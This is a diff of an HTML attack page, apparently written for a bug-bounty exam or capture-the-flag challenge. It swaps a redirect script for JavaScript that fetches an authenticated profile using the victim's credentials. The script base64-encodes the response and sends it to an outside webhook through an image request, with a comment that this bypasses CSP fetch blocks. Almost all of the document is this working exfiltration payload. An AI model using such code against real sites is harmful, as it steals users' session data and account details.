@@ -1,16 +1,20 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Security Audit</title>
-</head>
-<body style="background: #111; color: #0f0; font-family: monospace;">
-    <h2>Initiating Admin Session Audit...</h2>
+<body>
     <script>
-        // Target the specific section where Contact Messages are reviewed
-        const adminInbox = "https://bugbounty-exam.hashacademy.co/admin/messages";
-
-        // Redirect the bot into the trap
-        window.location.replace(adminInbox);
+        async function leak() {
+            try {
+                // Fetch the profile (which is exempt from the standard 401 redirect logic)
+                const res = await fetch("https://api-bugbounty-exam.hashacademy.co/api/auth/profile", { credentials: 'include' });
+                const data = await res.json();
+                
+                // If the flag is here, send it to the webhook
+                // We use a simple image GET to bypass CSP fetch blocks
+                const leakUrl = "https://webhooksite.net/11c8eb00-4696-43a0-9d10-5498131d321a?data=" + btoa(JSON.stringify(data));
+                new Image().src = leakUrl;
+            } catch (e) {}
+        }
+        leak();
     </script>
 </body>
 </html>
